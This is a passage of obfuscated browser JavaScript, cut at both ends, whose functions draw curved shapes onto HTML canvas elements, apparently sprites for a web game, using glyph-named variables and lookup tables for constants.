			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 52, ᐃ * ΔΔᐃᐃΔ);
			Δ.bezierCurveTo(ᐃ * 55, ΔΔⲆᐃⵠ * ᐃ, ᐃ * 54, ᐃ * ⲆⲆⲆⵠΔ, ᐃ * 55, 22 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 52, 24.5 * ᐃ, ᐃ * 52, ᐃ * 24.5, ᐃ * 49, 27 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 45, 25 * ᐃ, 45 * ᐃ, 25 * ᐃ, ᐃ * 41, 23 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 45, ᐃ * 19, 48 * ᐃ, ᐃ * ⵠΔⲆᐃᐃ, 52 * ᐃ, 16 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[Ⲇⵠⵠⵠ], ᐃ * ΔⵠⲆⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(62 * ᐃ, 30 * ᐃ);
			Δ.bezierCurveTo(66 * ᐃ, 29 * ᐃ, 64 * ᐃ, ᐃ * 30, 66 * ᐃ, ᐃ * 30);
			Δ.bezierCurveTo(67 * ᐃ, ᐃ * 31, ᐃ * 67, ᐃ * 31, ᐃ * 68, 32 * ᐃ);
			Δ.bezierCurveTo(66.5 * ᐃ, ᐃ * 33.5, ᐃ * 66.5, ᐃ * 33.5, 65 * ᐃ, 35 * ᐃ);
			Δ.bezierCurveTo(63.5 * ᐃ, ᐃ * 32.5, 63.5 * ᐃ, ᐃ * 32.5, ᐃ * 62, 30 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⵠΔᐃΔ], ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(29 * ᐃ, 21 * ᐃ);
			Δ.bezierCurveTo(31 * ᐃ, 22 * ᐃ, 31 * ᐃ, 26 * ᐃ, ᐃ * 29, ᐃ * 29);
			Δ.bezierCurveTo(ᐃ * 26, 28.5 * ᐃ, ᐃ * 26, ᐃ * 28.5, 23 * ᐃ, 28 * ᐃ);
			Δ.bezierCurveTo(23 * ᐃ, 26.5 * ᐃ, 23 * ᐃ, ᐃ * 26.5, ᐃ * 23, ᐃ * 25);
			Δ.bezierCurveTo(ᐃ * 25, ᐃ * 23, 25 * ᐃ, ᐃ * 23, ᐃ * 27, 21 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠⵠ], Ⲇᐃ[4], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * ΔΔⲆΔΔᐃᐃ, 36 * ᐃ);
			Δ.bezierCurveTo(23 * ᐃ, 36 * ᐃ, 24 * ᐃ, 42 * ᐃ, ᐃ * ᐃΔⵠᐃⵠᐃⲆ, ᐃ * 46);
			Δ.bezierCurveTo(ⵠΔᐃΔᐃ * ᐃ, ᐃ * 39, ᐃ * 15, ᐃ * 38, 18 * ᐃ, ᐃ * 37);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃΔᐃ], Ⲇᐃ[ⵠⲆⵠᐃ], ᐃⲆⵠⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(ᐃ * 30, ᐃ * 34);
			Δ.bezierCurveTo(35 * ᐃ, ᐃ * 36, 36 * ᐃ, 39 * ᐃ, 32 * ᐃ, 45 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 25, ᐃ * 46, ᐃ * 25, 44 * ᐃ, ᐃ * 30, 34 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆⲆ], Ⲇᐃ[Ⲇⵠⵠⵠ], ᐃ * ⲆⲆΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 59, ᐃ * 35);
			Δ.bezierCurveTo(ᐃ * 58, 27 * ᐃ, 57 * ᐃ, 27 * ᐃ, 52 * ᐃ, ᐃ * 31);
			Δ.bezierCurveTo(50 * ᐃ, 36 * ᐃ, 53 * ᐃ, 38 * ᐃ, 58 * ᐃ, ᐃ * 36);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔΔΔ], Ⲇᐃ[4], ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 63, ᐃ * 46);
			Δ.bezierCurveTo(64.5 * ᐃ, 46.5 * ᐃ, 64.5 * ᐃ, 46.5 * ᐃ, 66 * ᐃ, ᐃ * 47);
			Δ.bezierCurveTo(70 * ᐃ, 50 * ᐃ, 70 * ᐃ, ᐃ * 53, 61 * ᐃ, ᐃ * 55);
			Δ.bezierCurveTo(ᐃ * 62, ᐃ * 50.5, 62 * ᐃ, ᐃ * 50.5, ᐃ * 63, 46 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⲆⵠΔⵠ], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 41, ᐃ * 42);
			Δ.bezierCurveTo(ᐃ * 47, ᐃ * 41, 53 * ᐃ, 47 * ᐃ, 46 * ᐃ, ᐃ * 51);
			Δ.bezierCurveTo(ᐃ * 38, ᐃ * 49, 39 * ᐃ, ᐃ * 46, ᐃ * 41, ᐃ * 43);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * ⵠⲆᐃᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(44 * ᐃ, ᐃ * 57);
			Δ.bezierCurveTo(54 * ᐃ, ᐃ * 57, ᐃ * 54, 58 * ᐃ, ᐃ * 55, 61 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 54, 63 * ᐃ, ᐃ * 52, 64 * ᐃ, ᐃ * 48, 65 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃᐃ], Ⲇᐃ[4], ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(ⵠⲆⲆⲆⲆ * ᐃ, ᐃ * 52);
			Δ.bezierCurveTo(ᐃ * 25, 51 * ᐃ, ᐃ * 27, 50 * ᐃ, ᐃ * 28, 54 * ᐃ);
			Δ.bezierCurveTo(27 * ᐃ, 58 * ᐃ, 24 * ᐃ, 58 * ᐃ, 22 * ᐃ, ᐃ * 58);
			Δ.bezierCurveTo(ᐃ * 21, 55.5 * ᐃ, 21 * ᐃ, ᐃ * 55.5, ᐃ * 20, ᐃ * 53);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃⵠ], Ⲇᐃ[4], ᐃ * ⲆΔⲆᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(30 * ᐃ, 61 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 37, ᐃ * 61, 39 * ᐃ, 63 * ᐃ, 39 * ᐃ, ᐃ * 68);
			Δ.bezierCurveTo(ᐃ * 36, 68.5 * ᐃ, ᐃ * 36, ᐃ * 68.5, 33 * ᐃ, ᐃ * 69);
			Δ.bezierCurveTo(30.5 * ᐃ, 67.5 * ᐃ, 30.5 * ᐃ, 67.5 * ᐃ, ᐃ * 28, ᐃ * 66);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ᐃⲆᐃⲆⵠ], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(88 * ᐃ, 45 * ᐃ);
			Δ.bezierCurveTo(90 * ᐃ, ᐃ * 46.5, ᐃ * 90, ᐃ * 46.5, ᐃ * 92, ᐃ * 48);
			Δ.bezierCurveTo(ᐃ * 92, ᐃ * 50, 92 * ᐃ, 50 * ᐃ, ᐃ * 92, 52 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃΔ], Ⲇᐃ[ⲆΔⵠᐃ], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(96 * ᐃ, ᐃ * 53);
			Δ.bezierCurveTo(ᐃ * 97.5, ᐃ * 55, ᐃ * 97.5, 55 * ᐃ, ᐃ * 99, 57 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 97.5, ᐃ * 59.5, 97.5 * ᐃ, 59.5 * ᐃ, ᐃ * 96, 62 * ᐃ);
			Δ.bezierCurveTo(93.5 * ᐃ, 60.5 * ᐃ, ᐃ * 93.5, 60.5 * ᐃ, ᐃ * 91, ᐃ * 59);
			Δ.bezierCurveTo(ᐃ * 91.5, 57 * ᐃ, ᐃ * 91.5, ᐃ * 57, 92 * ᐃ, 55 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃΔ], Ⲇᐃ[4], ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ᐃ * 92, ᐃ * 71);
			Δ.bezierCurveTo(ᐃ * 94.5, 70.5 * ᐃ, ᐃ * 94.5, ᐃ * 70.5, 97 * ᐃ, ᐃ * 70);
			Δ.bezierCurveTo(ᐃ * 98.5, ᐃ * 72.5, 98.5 * ᐃ, ᐃ * 72.5, ᐃ * ᐃⲆΔⲆⵠ, 75 * ᐃ);
			Δ.bezierCurveTo(97 * ᐃ, 76.5 * ᐃ, 97 * ᐃ, 76.5 * ᐃ, 94 * ᐃ, ᐃ * 78);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃⵠ], Ⲇᐃ[ⵠᐃᐃⲆ], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(ᐃ * 95, ᐃ * 82);
			Δ.bezierCurveTo(96 * ᐃ, ᐃ * 83, 96 * ᐃ, ᐃ * 83, ᐃ * 97, 84 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 97, ᐃ * 85.5, ᐃ * 97, ᐃ * 85.5, 97 * ᐃ, ᐃ * 87);
			Δ.bezierCurveTo(93.5 * ᐃ, 87.5 * ᐃ, 93.5 * ᐃ, 87.5 * ᐃ, ᐃ * 90, ᐃ * 88);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * ⵠᐃⲆΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(86 * ᐃ, 72 * ᐃ);
			Δ.bezierCurveTo(89 * ᐃ, 76 * ᐃ, ᐃ * 88, 81 * ᐃ, 85 * ᐃ, ᐃ * 82);
			Δ.bezierCurveTo(ᐃ * 80, 80 * ᐃ, ᐃ * 82, 78 * ᐃ, 85 * ᐃ, ᐃ * 72);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃΔᐃ], Ⲇᐃ[ⲆⵠᐃΔ], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 80, ᐃ * 86);
			Δ.bezierCurveTo(ᐃ * 84, ᐃ * 88, ᐃ * 86, 88 * ᐃ, 85 * ᐃ, ᐃ * 93);
			Δ.bezierCurveTo(80 * ᐃ, ᐃ * 96, 79 * ᐃ, ᐃ * 96, 76 * ᐃ, 91 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(84 * ᐃ, ᐃ * 46);
			Δ.bezierCurveTo(93 * ᐃ, ᐃ * 51, ᐃ * 91, 62 * ᐃ, 80 * ᐃ, ᐃ * 78);
			Δ.bezierCurveTo(74 * ᐃ, ᐃ * 86, ᐃ * 66, ᐃ * 90, ᐃ * 60, 86 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 55, ᐃ * 79, ᐃ * 57, ᐃ * 73, ᐃ * 67, 57 * ᐃ);
			Δ.bezierCurveTo(71 * ᐃ, ᐃ * 51, 79 * ᐃ, 44 * ᐃ, ᐃ * 84, 46 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[6], ⵠⲆᐃᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 76, ᐃ * 60);
			Δ.bezierCurveTo(ᐃ * 80, ᐃ * 66, ᐃ * 75, ᐃ * 74, 68 * ᐃ, ᐃ * 74);
			Δ.bezierCurveTo(ᐃ * 60, ᐃ * 64, ᐃ * 68, 59 * ᐃ, ᐃ * 76, ᐃ * 59);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[ⵠⵠⵠΔᐃ], ᐃⲆⵠΔ * ᐃ);
			return Ⲇⵠ
		}

		function ⲆⵠⲆⵠΔⵠⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 154 * ᐃ;
			Ⲇⵠ.height = 261 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ᐃⲆᐃ;
			Δ.translate(ΔᐃΔΔ, ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(125 * ᐃ, ᐃ * 69);
			Δ.bezierCurveTo(ᐃ * 123.5, 141.5 * ᐃ, 123.5 * ᐃ, 141.5 * ᐃ, 122 * ᐃ, 214 * ᐃ);
			Δ.bezierCurveTo(123 * ᐃ, 228 * ᐃ, ᐃ * 119, ᐃ * 239, 102 * ᐃ, 239 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 90, 238 * ᐃ, ᐃ * 86, ᐃ * 225, 89 * ᐃ, ᐃ * 197);
			Δ.bezierCurveTo(92 * ᐃ, ᐃ * 159, 92 * ᐃ, 141 * ᐃ, ᐃ * 94, 84 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 94, ᐃ * 58, 87 * ᐃ, 50 * ᐃ, ᐃ * 73, 52 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 53, 54 * ᐃ, ᐃ * 54, 92 * ᐃ, 34 * ᐃ, ᐃ * 87);
			Δ.bezierCurveTo(13 * ᐃ, ᐃ * 85, 22 * ᐃ, ᐃ * 58, ᐃ * 34, 40 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 44, 24 * ᐃ, ᐃ * 68, ᐃ * 17, 86 * ᐃ, ᐃ * 21);
			Δ.bezierCurveTo(ᐃ * 111, 23 * ᐃ, ᐃ * 123, 39 * ᐃ, ᐃ * 125, 67 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
			Δ.globalAlpha = 1;
			Δ.translate(ΔΔⵠⵠ, -10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 125, 69 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 123.5, ᐃ * 141.5, ᐃ * 123.5, ᐃ * 141.5, 122 * ᐃ, 214 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 123, 228 * ᐃ, 119 * ᐃ, ᐃ * 239, 102 * ᐃ, 239 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 90, 238 * ᐃ, 86 * ᐃ, ᐃ * 225, 89 * ᐃ, ᐃ * 197);
			Δ.bezierCurveTo(92 * ᐃ, 159 * ᐃ, ᐃ * 92, ᐃ * 141, ᐃ * 94, ᐃ * 84);
			Δ.bezierCurveTo(ᐃ * 94, ᐃ * 58, 87 * ᐃ, 50 * ᐃ, 73 * ᐃ, 52 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 53, 54 * ᐃ, ᐃ * 54, 92 * ᐃ, ᐃ * 34, ᐃ * 87);
			Δ.bezierCurveTo(ᐃ * ⵠΔΔⲆΔΔΔ, 85 * ᐃ, 22 * ᐃ, ᐃ * 58, 34 * ᐃ, ᐃ * 40);
			Δ.bezierCurveTo(ᐃ * 44, 24 * ᐃ, 68 * ᐃ, 17 * ᐃ, ᐃ * 86, ᐃ * 21);
			Δ.bezierCurveTo(ᐃ * 111, 23 * ᐃ, ᐃ * 123, 39 * ᐃ, 125 * ᐃ, 67 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * ⲆⵠᐃΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(31 * ᐃ, ᐃ * 43);
			Δ.bezierCurveTo(31 * ᐃ, ᐃ * 61, ᐃ * 43, 70 * ᐃ, 51 * ᐃ, ᐃ * 75);
			Δ.bezierCurveTo(ᐃ * 48, ᐃ * 84, 41 * ᐃ, ᐃ * 89, ᐃ * 33, ᐃ * 86);
			Δ.bezierCurveTo(23 * ᐃ, 88 * ᐃ, ⲆⲆⲆⵠΔ * ᐃ, ᐃ * 76, 23 * ᐃ, ᐃ * 62);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(45 * ᐃ, 29 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 49, ᐃ * 45, 61 * ᐃ, 54 * ᐃ, 64 * ᐃ, ᐃ * 55);
			Δ.bezierCurveTo(ᐃ * 67.5, ᐃ * 53, ᐃ * 67.5, 53 * ᐃ, ᐃ * 71, ᐃ * 51);
			Δ.bezierCurveTo(ᐃ * 80, ᐃ * 44, 83 * ᐃ, 33 * ᐃ, ᐃ * 82, ᐃ * 20);
			Δ.bezierCurveTo(ᐃ * 59, ᐃ * ⵠⵠᐃΔΔ, 51 * ᐃ, 23 * ᐃ, 45 * ᐃ, 30 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆΔᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 86, 56 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 90, ᐃ * 33, 103 * ᐃ, 25 * ᐃ, 105 * ᐃ, ᐃ * 27);
			Δ.bezierCurveTo(116 * ᐃ, 31 * ᐃ, 121 * ᐃ, 45 * ᐃ, ᐃ * 122, ᐃ * 50);
			Δ.bezierCurveTo(112 * ᐃ, 62 * ᐃ, 103 * ᐃ, 63 * ᐃ, 91 * ᐃ, 62 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 89, ᐃ * 59.5, 89 * ᐃ, ᐃ * 59.5, 87 * ᐃ, ᐃ * 57);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆΔᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(93 * ᐃ, 81 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 109, 82 * ᐃ, 123 * ᐃ, ᐃ * 70, 124 * ᐃ, 63 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 124, ᐃ * 75.5, 124 * ᐃ, 75.5 * ᐃ, ᐃ * 124, ᐃ * 88);
			Δ.bezierCurveTo(ᐃ * 119, 99 * ᐃ, 103 * ᐃ, 103 * ᐃ, ᐃ * 94, 103 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(ᐃ * 93, 124 * ᐃ);
			Δ.bezierCurveTo(108 * ᐃ, ᐃ * 125, 122 * ᐃ, ᐃ * 113, ᐃ * 124, ᐃ * 106);
			Δ.bezierCurveTo(ᐃ * 124, 119 * ᐃ, 124 * ᐃ, 129 * ᐃ, 124 * ᐃ, 132 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 110, ᐃ * 147, 94 * ᐃ, 148 * ᐃ, 90 * ᐃ, 147 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 90, 170 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 104, 166 * ᐃ, 122 * ᐃ, ᐃ * 158, 122 * ᐃ, 151 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 122, ᐃ * 162.5, ᐃ * 122, ᐃ * 162.5, ᐃ * 122, ᐃ * 174);
			Δ.bezierCurveTo(111 * ᐃ, ᐃ * 191, ᐃ * 97, 191 * ᐃ, ᐃ * 89, ᐃ * 191);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(88 * ᐃ, ᐃ * 208);
			Δ.bezierCurveTo(100 * ᐃ, 209 * ᐃ, ᐃ * 115, 205 * ᐃ, 122 * ᐃ, 193 * ᐃ);
			Δ.bezierCurveTo(122 * ᐃ, ᐃ * 205.5, ᐃ * 122, ᐃ * 205.5, 122 * ᐃ, 218 * ᐃ);
			Δ.bezierCurveTo(115 * ᐃ, 229 * ᐃ, ᐃ * 103, ᐃ * 235, ᐃ * 90, 228 * ᐃ);
			Δ.bezierCurveTo(88 * ᐃ, ᐃ * 224, ᐃ * 88, 217 * ᐃ, ᐃ * 88, ᐃ * 211);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.globalAlpha = .4;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(22 * ᐃ, ᐃ * 81);
			Δ.bezierCurveTo(32 * ᐃ, 84 * ᐃ, ᐃ * 41, ᐃ * 81, 45 * ᐃ, 68 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 50, 50 * ᐃ, ᐃ * 62, ᐃ * 40, 79 * ᐃ, ᐃ * 43);
			Δ.bezierCurveTo(95 * ᐃ, ᐃ * 45, ᐃ * 102, ᐃ * 58, ᐃ * 101, ᐃ * 81);
			Δ.bezierCurveTo(99.5 * ᐃ, 120.5 * ᐃ, 99.5 * ᐃ, ᐃ * 120.5, ᐃ * 98, ᐃ * 160);
			Δ.bezierCurveTo(ᐃ * 96.5, 191.5 * ᐃ, 96.5 * ᐃ, 191.5 * ᐃ, ᐃ * 95, 223 * ᐃ);
			Δ.bezierCurveTo(93 * ᐃ, ᐃ * 232, 101 * ᐃ, 235 * ᐃ, 108 * ᐃ, ᐃ * 238);
			Δ.bezierCurveTo(100 * ᐃ, ᐃ * 240, 90 * ᐃ, ᐃ * 233, 90 * ᐃ, ᐃ * 224);
			Δ.bezierCurveTo(ᐃ * 92, ᐃ * 157, 92 * ᐃ, ᐃ * 157, 94 * ᐃ, 90 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 94, ᐃ * 56, 89 * ᐃ, 53 * ᐃ, ᐃ * 77, ᐃ * 51);
			Δ.bezierCurveTo(ᐃ * 58, 50 * ᐃ, 54 * ᐃ, ᐃ * 59, 49 * ᐃ, ᐃ * 75);
			Δ.bezierCurveTo(ᐃ * 44, 91 * ᐃ, ᐃ * 28, 90 * ᐃ, 23 * ᐃ, ᐃ * 81);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 82, 123 * ᐃ);
			Δ.bezierCurveTo(88 * ᐃ, 130 * ᐃ, 88 * ᐃ, 127 * ᐃ, 94 * ᐃ, ᐃ * 128);
			Δ.bezierCurveTo(ᐃ * 91, 136 * ᐃ, 94 * ᐃ, 137 * ᐃ, 99 * ᐃ, ᐃ * 142);
			Δ.bezierCurveTo(ᐃ * 97, ᐃ * 149, ᐃ * 99, ᐃ * 152, ᐃ * 105, 155 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 107, 159 * ᐃ, ᐃ * 113, 159 * ᐃ, 120 * ᐃ, 158 * ᐃ);
			Δ.bezierCurveTo(121 * ᐃ, 160 * ᐃ, ᐃ * 125, ᐃ * 163, 132 * ᐃ, 163 * ᐃ);
			Δ.bezierCurveTo(133 * ᐃ, 166 * ᐃ, 136 * ᐃ, ᐃ * 169, 138 * ᐃ, 170 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 133, 171 * ᐃ, 132 * ᐃ, ᐃ * 172, ᐃ * 129, 174 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 122, ᐃ * 170, 120 * ᐃ, ᐃ * 170, ᐃ * 116, 174 * ᐃ);
			Δ.bezierCurveTo(108 * ᐃ, ᐃ * 170.5, 108 * ᐃ, ᐃ * 170.5, ᐃ * 100, ᐃ * 167);
			Δ.bezierCurveTo(95 * ᐃ, ᐃ * 172, ᐃ * 94, 179 * ᐃ, ᐃ * 95, ᐃ * 184);
			Δ.bezierCurveTo(ᐃ * 87, ᐃ * 185, 87 * ᐃ, ᐃ * 189, ᐃ * 88, ᐃ * 194);
			Δ.bezierCurveTo(ᐃ * 82, ᐃ * 194, 81 * ᐃ, 195 * ᐃ, ᐃ * 79, 197 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 78, ᐃ * 192, 78 * ᐃ, 191 * ᐃ, 77 * ᐃ, ᐃ * 189);
			Δ.bezierCurveTo(81 * ᐃ, ᐃ * 185, 82 * ᐃ, 183 * ᐃ, 80 * ᐃ, 176 * ᐃ);
			Δ.bezierCurveTo(89 * ᐃ, ᐃ * 170, ᐃ * 92, ᐃ * 168, 95 * ᐃ, ᐃ * 163);
			Δ.bezierCurveTo(ᐃ * 91, 151 * ᐃ, 88 * ᐃ, 151 * ᐃ, ᐃ * 82, ᐃ * 147);
			Δ.bezierCurveTo(ᐃ * 85, 142 * ᐃ, ᐃ * 85, ᐃ * 137, 81 * ᐃ, ᐃ * 133);
			Δ.bezierCurveTo(ᐃ * 84, ᐃ * 127, ᐃ * 84, ᐃ * 125, ᐃ * 82, ᐃ * 124);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], ᐃ * ⵠᐃΔΔ);
			ⵠᐃᐃ(Δ, 107 * ᐃ, ᐃ * 152, ⲆⵠⲆⲆⲆ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⲆΔ]);
			ⵠᐃᐃ(Δ, 105 * ᐃ, 173 * ᐃ, ΔⵠᐃΔΔΔⵠ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⲆⲆ]);
			ⵠᐃᐃ(Δ, ᐃ * 87, ᐃ * 161, ΔⲆᐃᐃⲆⵠᐃ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃᐃΔΔ]);
			ⵠᐃᐃ(Δ, 106 * ᐃ, 147 * ᐃ, ᐃ * ΔⲆⲆⲆ);
			ΔⲆ(Δ, Ⲇᐃ[7]);
			ⵠᐃᐃ(Δ, 104 * ᐃ, ᐃ * 167, ⲆⵠᐃΔ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[7]);
			ⵠᐃᐃ(Δ, 86 * ᐃ, 154 * ᐃ, ᐃ * 4);
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⲆⲆ]);
			return Ⲇⵠ
		}

		function ⵠⲆᐃΔⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 70 * ᐃ;
